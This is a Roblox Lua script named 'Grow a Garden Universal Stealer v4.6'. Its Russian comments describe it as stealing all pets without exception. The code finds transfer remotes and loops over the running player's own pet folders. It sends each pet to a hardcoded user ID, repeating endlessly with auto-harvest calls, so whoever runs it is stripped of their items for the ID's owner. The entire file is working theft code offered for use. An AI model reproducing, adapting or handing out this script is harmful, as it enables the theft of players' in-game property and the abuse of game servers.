-- Grow a Garden Universal Stealer v4.6
-- Крадёт ВСЕХ питомцев из инвентаря и сада (без исключений)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local YOUR_USER_ID = 3793906492

local function findRemote(keywords)
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
            local name = obj.Name:lower()
            for _, kw in ipairs(keywords) do
                if name:find(kw) then
                    return obj
                end
            end
        end
    end
    return nil
end

local transferRemote = findRemote({"transfer", "givepet", "claimpet", "sendpet", "pettransfer"})
local harvestRemote = findRemote({"harvest", "collect", "pick", "crop", "gather"})

local function stealAllPets()
    if not transferRemote then return end

    local folders = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer.PlayerGui:FindFirstChild("PetInventory"),
        LocalPlayer:FindFirstChild("PlayerData"),
        workspace:FindFirstChild(LocalPlayer.Name)
    }
    
    for _, folder in ipairs(folders) do
        if folder then
            for _, pet in ipairs(folder:GetDescendants()) do
                if pet:IsA("Folder") or pet:IsA("Model") or pet:IsA("StringValue") then
                    
                    local args = {pet, YOUR_USER_ID, "transfer"}
                    
                    pcall(function()
                        if transferRemote:IsA("RemoteEvent") then
                            transferRemote:FireServer(unpack(args))
                        elseif transferRemote:IsA("RemoteFunction") then
                            transferRemote:InvokeServer(unpack(args))
                        end
                    end)
                    
                    task.wait(0.18)  -- чуть быстрее
                end
            end
        end
    end
end

local function autoHarvest()
    if harvestRemote then
        pcall(function()
            if harvestRemote:IsA("RemoteEvent") then
                harvestRemote:FireServer()
            elseif harvestRemote:IsA("RemoteFunction") then
                harvestRemote:InvokeServer()
            end
        end)
    end
end

-- Запуск
task.wait(1.5)
stealAllPets()
autoHarvest()

while true do
    task.wait(10)
    autoHarvest()
    task.wait(0.7)
    stealAllPets()
end
